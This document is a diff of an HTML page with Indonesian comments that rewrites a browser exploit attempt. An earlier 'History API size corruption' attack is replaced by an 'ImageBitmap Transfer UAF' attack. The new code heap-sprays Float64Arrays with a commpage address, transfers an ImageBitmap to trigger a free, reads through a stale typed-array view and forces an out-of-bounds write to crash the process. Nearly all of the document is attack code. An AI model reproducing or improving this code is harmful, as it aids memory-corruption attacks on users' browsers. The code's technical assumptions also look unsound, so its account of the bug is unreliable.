@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>History API Size Corruption (Final Attempt)</title>
+    <title>ImageBitmap Transfer UAF Attack</title>
 </head>
 <body>
 
-    <h1>History API Size Corruption (Menargetkan Length)</h1>
+    <h1>ImageBitmap Transfer UAF (Final DOM-based Attack)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Serangan History API V6...</p>
+    <p id="status">INIT: Mempersiapkan ImageBitmap Transfer UAF...</p>
     <div id="log-area"></div>
 
+    <canvas id="victimCanvas" width="200" height="200"></canvas>
+    
     <script>
         // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
         const COMM_PAGE_ASB_TARGET_VALUE = COMM_PAGE64_BASE_ADDRESS + BigInt("0x320"); 
         
-        // Kita gunakan nilai Commpage 64-bit sebagai nilai LENGTH/SIZE
-        const SIZE_OVERFLOW_HIGH = Number(COMM_PAGE_ASB_TARGET_VALUE >> 32n);
-        const SIZE_OVERFLOW_LOW = Number(COMM_PAGE_ASB_TARGET_VALUE & 0xFFFFFFFFn); 
+        const LOW_WORD = Number(COMM_PAGE_ASB_TARGET_VALUE & 0xFFFFFFFFn); 
+        const HIGH_WORD = Number(COMM_PAGE_ASB_TARGET_VALUE >> 32n);
 
         let startTime = performance.now();
         let payloadHolders = []; 
-        let historyStates = []; 
-        let victimArray = null; // Korban terpisah untuk OOB Read
+        let victimImageData = null;
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -33,91 +33,94 @@
 
         // --- FUNGSI HEAP SPRAY PAYLOAD ---
         function sprayPayload() {
-            log("Memulai Spraying Payload (Targeting Size)...", "log-spray");
-            const SPRAY_COUNT = 3000; 
+            log("Memulai Spraying Payload (Float64Array)...", "log-spray");
+            const SPRAY_COUNT = 3000;
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                
-                // Di sini kita menempatkan nilai 64-bit Commpage di lokasi yang diduga menyimpan Length/Size
-                // Lokasi 4-8 word setelah header seringkali menyimpan panjang/size
-                payloadArray[4] = SIZE_OVERFLOW_HIGH; 
-                payloadArray[5] = SIZE_OVERFLOW_LOW;  
-                payloadArray[6] = 2035.0 + i; 
+                // Payload menimpa pointer data/metadata
+                payloadArray[0] = HIGH_WORD; 
+                payloadArray[1] = LOW_WORD;
                 payloadHolders.push(payloadArray); 
             }
         }
 
         // --- FUNGSI UTAMA ATTACK ---
-        function runHistoryAttack() {
+        function runImageBitmapAttack() {
             startTime = performance.now();
-            log("Phase 1: History Grooming & Victim Array Setup.", "log-init");
+            log("Phase 1: Setup Canvas dan Context.", "log-init");
 
-            const HISTORY_COUNT = 100;
-            const STATE_ARRAY_SIZE = 1024 * 10; // Ukuran state yang ditarget
+            const canvas = document.getElementById('victimCanvas');
+            const ctx = canvas.getContext('2d');
             
-            // 1. Grooming History States
-            for (let i = 0; i < HISTORY_COUNT; i++) {
-                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
-                stateArray.fill(0xFEEDFACE + i);
-                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
-                historyStates.push(stateArray);
-            }
+            // Grooming: Alokasikan buffer data canvas (korban)
+            ctx.fillStyle = 'red';
+            ctx.fillRect(0, 0, 200, 200);
             
-            // 2. Alokasi Array Korban di Heap yang sama
-            victimArray = new Uint32Array(STATE_ARRAY_SIZE);
-            victimArray.fill(0xBBBBBBBB); 
-            log("Phase 2: Victim Array dialokasikan dekat History States.", "log-info");
-            
-            // --- KONDISI KRITIS: FREE 1 & SPRAY ---
+            // Dapatkan data buffer (yang merupakan korban UAF)
+            victimImageData = ctx.getImageData(0, 0, 200, 200);
+            const victimDataView = new Uint32Array(victimImageData.data.buffer);
+            victimDataView[0] = 0xDEADBEEF; // Nilai penanda
 
-            // 3. FREE 1: Kembali ke state awal (memaksa pembersihan 99 state)
-            window.history.go(-HISTORY_COUNT + 1);
-            log("Phase 3: Navigasi cepat (FREE 1 aktif).", "log-critical");
-
-            // Lakukan Spray SINKRON
-            // Menimpa lokasi memori yang kosong (termasuk header korban)
-            sprayPayload(); 
-            log("Phase 4: SPRAY Commpage Payload SINKRON (Targeting Size).", "log-critical");
-            
-            // Hapus referensi JS
-            historyStates = null;
-            
-            // --- TRIGGER: Akses Korban ---
-            
-            setTimeout(() => {
-                log("Phase 5: Memicu Arbitrary Read pada Victim Array...", "log-critical");
+            // 1. FREE (Async): Buat ImageBitmap dan Transfer.
+            // ImageBitmap menyimpan pointer ke data canvas (korban). 
+            createImageBitmap(canvas).then(imageBitmap => {
+                log("Phase 2: ImageBitmap dibuat. Memicu FREE (Transfer).", "log-critical");
                 
-                try {
-                    // Coba baca length yang seharusnya sekarang sangat besar (Commpage)
-                    const corruptLength = victimArray.length;
-                    
-                    // Kita asumsikan length telah ditimpa, sekarang lakukan OOB Read
-                    const OOB_INDEX = corruptLength + 1000;
-                    
-                    // Ini akan membaca memori yang jauh, berpotensi ke Commpage
-                    const crashValue = victimArray[OOB_INDEX];
-                    
-                    log(`Nilai OOB dibaca (32-bit): 0x${crashValue.toString(16)}`, "log-critical");
+                // Memicu Transfer (FREE): mengirim ImageBitmap ke dirinya sendiri
+                // Ini akan me-*free* data buffer internal C++ ImageBitmap/Canvas
+                window.postMessage({ bitmap: imageBitmap }, '*', [imageBitmap]);
 
-                    // Trigger Final (Jika OOB Read berhasil, kita crash dengan nilai tersebut)
-                    if (crashValue) {
-                         // Ini akan menghasilkan EXC_BAD_ACCESS jika crashValue adalah alamat
-                        let crashFunction = new Function('a', `return a[${crashValue}]`);
-                        crashFunction(new Array(10)); 
+                // --- SPRAY SINKRON ---
+                // Data buffer yang baru di-free harus segera ditimpa
+                sprayPayload(); 
+                log("Phase 3: SPRAY Commpage Payload SINKRON.", "log-critical");
+
+                // --- TRIGGER ---
+                // Coba akses data dari ImageData yang dibuat di awal
+                // Pointer C++ di belakang victimDataView sekarang seharusnya corrupt
+                setTimeout(() => {
+                    log("Phase 4: Memicu Arbitrary Read pada ImageData yang Corrupt...", "log-critical");
+                    
+                    try {
+                        // Baca data dari view yang menunjuk ke buffer yang di-free/ditimpa
+                        const readHigh = victimDataView[0];
+                        const readLow = victimDataView[1];
+                        
+                        log(`Nilai dibaca (High): 0x${readHigh.toString(16)}`, "log-critical");
+                        log(`Nilai dibaca (Low): 0x${readLow.toString(16)}`, "log-critical");
+                        
+                        // Jika berhasil, nilai yang dibaca adalah payload Commpage
+                        if (readHigh === HIGH_WORD) {
+                             log("SUCCESS: Arbitrary Read primitif ImageBitmap UAF!", "log-success");
+                        }
+                        
+                        // Trigger Final: OOB Write / Arbitrary Write
+                        victimDataView[1000000] = 0x1234; // OOB Write yang seharusnya crash
+
+                    } catch(e) {
+                         log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
                     }
+                }, 50);
 
-                } catch(e) {
-                     log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
-                }
-            }, 100);
+            }).catch(e => {
+                log(`Error: Gagal membuat ImageBitmap: ${e.message}`, "log-error");
+            });
         }
         
+        // Listener PostMessage (hanya untuk membersihkan event loop)
+        window.onmessage = function(e) {
+            if (e.data && e.data.bitmap) {
+                 // ImageBitmap diterima dan dibuang (memastikan free terjadi)
+                log("ImageBitmap diterima dan Transfer Selesai.", "log-info");
+            }
+        };
+
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian History API V6...';
-            setTimeout(runHistoryAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Length Corruption.';
+            document.getElementById('status').textContent = 'Memulai rangkaian ImageBitmap UAF Attack...';
+            setTimeout(runImageBitmapAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah ImageBitmap Transfer UAF.';
         });
     </script>
     <style>
@@ -127,6 +130,7 @@
         .log-spray { color: purple; }
         .log-critical { color: red; font-weight: bold; }
         .log-success { color: green; font-weight: bold; }
+        .log-error { color: darkred; font-weight: bold; }
     </style>
 </body>
 </html>
